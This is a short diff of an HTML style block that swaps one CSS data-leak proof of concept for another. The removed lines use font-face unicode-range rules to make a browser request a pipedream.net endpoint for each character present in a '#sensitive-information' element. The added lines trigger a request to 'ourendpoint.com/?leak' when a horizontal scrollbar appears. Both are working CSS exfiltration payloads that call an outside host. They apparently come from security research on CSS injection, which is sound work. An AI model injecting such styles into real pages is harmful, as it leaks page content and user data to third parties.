@@ -1,20 +1,5 @@
 <style>
-@font-face{
-    font-family:poc;
-    src: url(https://eoyrdicds9j0wbn.m.pipedream.net/?A); /* fetched */
-    unicode-range:U+0041;
-}
-@font-face{
-    font-family:poc;
-    src: url(https://eoyrdicds9j0wbn.m.pipedream.net/?B); /* fetched too */
-    unicode-range:U+0042;
-}
-@font-face{
-    font-family:poc;
-    src: url(https://eoyrdicds9j0wbn.m.pipedream.net?C); /* not fetched */
-    unicode-range:U+0043;
-}
-#sensitive-information{
-    font-family:poc;
-}
+body { white-space: nowrap }; 
+body::-webkit-scrollbar { background: blue; }
+body::-webkit-scrollbar:horizontal { background: url(http://ourendpoint.com/?leak); }
 </style>
